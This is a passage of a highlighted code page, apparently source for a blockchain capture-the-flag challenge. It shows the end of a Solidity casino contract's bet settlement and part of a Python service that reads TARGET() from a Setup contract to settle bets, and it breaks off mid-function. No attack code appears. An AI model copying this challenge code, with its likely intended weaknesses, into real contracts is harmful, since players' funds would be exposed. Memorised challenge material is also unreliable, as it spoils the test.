+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">random_1_to_3</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payout</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">amount</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">// 2x payout for rock-paper-scissors
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">outcome</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">random_1_to_3</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payout</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">outcome</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">outcome</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// effects first
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">b</span><span class="p">.</span><span class="n">settled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b</span><span class="p">.</span><span class="n">won</span> <span class="o">=</span> <span class="n">outcome</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">outcome</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// transfer after state update to mitigate reentrancy
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">payable</span><span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="n">player</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">payout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">BetResolved</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">player</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">amount</span><span class="p">,</span> <span class="n">outcome</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Read a bet
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">getBet</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">id</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">player</span><span class="p">,</span> <span class="kt">uint8</span> <span class="n">machine</span><span class="p">,</span> <span class="kt">uint8</span> <span class="n">games</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">settled</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">won</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Bet</span> <span class="k">storage</span> <span class="n">b</span> <span class="o">=</span> <span class="n">bets</span><span class="p">[</span><span class="n">id</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="n">player</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">machine</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">games</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">amount</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">settled</span><span class="p">,</span> <span class="n">b</span><span class="p">.</span><span class="n">won</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Get balance
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">getBalance</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h5 id="casino_rngpy-">casino_rng.py :</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">logging</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">secrets</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">eth_account</span> <span class="kn">import</span> <span class="n">Account</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">,</span> <span class="nb">format</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">%(asctime)s</span><span class="s2"> </span><span class="si">%(levelname)s</span><span class="s2"> </span><span class="si">%(message)s</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HTTP_PORT</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;HTTP_PORT&#34;</span><span class="p">,</span> <span class="s2">&#34;8545&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Minimal ABI for interacting with Chal: BetPlaced event and settleBet function</span>
+</span></span><span class="line"><span class="cl"><span class="n">ABI</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;anonymous&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;inputs&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;address&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;player&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;address&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;amount&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;BetPlaced&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;event&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;anonymous&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;inputs&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;address&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;player&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;address&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;amount&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;bool&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;won&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;bool&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;BetResolved&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;event&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;inputs&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;outcome&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;settleCoinFlip&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;outputs&#34;</span><span class="p">:</span> <span class="p">[],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span> <span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;function&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;inputs&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;outcome&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;settleBlackJack&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;outputs&#34;</span><span class="p">:</span> <span class="p">[],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span> <span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;function&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;inputs&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;outcome&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;settleRockPaperScissors&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;outputs&#34;</span><span class="p">:</span> <span class="p">[],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span> <span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;function&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># add access to nextBetId and getBet so the service can scan for unsolved bets</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;inputs&#34;</span><span class="p">:</span> <span class="p">[],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;nextBetId&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;outputs&#34;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">}],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span> <span class="s2">&#34;view&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;function&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;inputs&#34;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">}],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;getBet&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;outputs&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;address&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;player&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;address&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint8&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;machine&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint8&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint8&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;games&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint8&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;amount&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;uint256&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;bool&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;settled&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;bool&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;bool&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;won&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;bool&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span> <span class="s2">&#34;view&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;function&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Minimal ABI for probing Setup: exposes TARGET() -&gt; address</span>
+</span></span><span class="line"><span class="cl"><span class="n">SETUP_ABI</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;inputs&#34;</span><span class="p">:</span> <span class="p">[],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;TARGET&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;outputs&#34;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span> <span class="s2">&#34;address&#34;</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;address&#34;</span><span class="p">}],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span> <span class="s2">&#34;view&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;function&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">secure_randint</span><span class="p">(</span><span class="n">a</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Return a cryptographically secure random integer N such that a &lt;= N &lt;= b.
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Implemented using secrets.randbelow which returns [0, n).
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">b</span> <span class="o">&lt;</span> <span class="n">a</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;secure_randint() upper bound must be &gt;= lower bound&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># secrets.randbelow(n) returns 0..n-1, so add a</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">secrets</span><span class="o">.</span><span class="n">randbelow</span><span class="p">(</span><span class="n">b</span> <span class="o">-</span> <span class="n">a</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">a</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">&#34;Casino RNG service: scans for unsolved bets and calls settleBet. Provide setup contract address.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;uuid&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Unique run id (for logging)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;deployer_privkey&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Deployer private key (hex, with or without 0x)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;setup_contract&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Setup contract address (positional) - used to read TARGET() which is the Chal address&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">priv</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">deployer_privkey</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">priv</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">priv</span> <span class="o">=</span> <span class="n">priv</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">acct</span> <span class="o">=</span> <span class="n">Account</span><span class="o">.</span><span class="n">from_key</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">priv</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rpc_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://127.0.0.1:</span><span class="si">{</span><span class="n">HTTP_PORT</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">uuid</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">HTTPProvider</span><span class="p">(</span><span class="n">rpc_url</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">w3</span><span class="o">.</span><span class="n">isConnected</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logging</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;Unable to connect to RPC </span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">rpc_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># normalize and read setup -&gt; TARGET</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">normalize_address</span><span class="p">(</span><span class="n">addr</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">addr</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;empty address&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">addr</span> <span class="o">=</span> <span class="n">addr</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
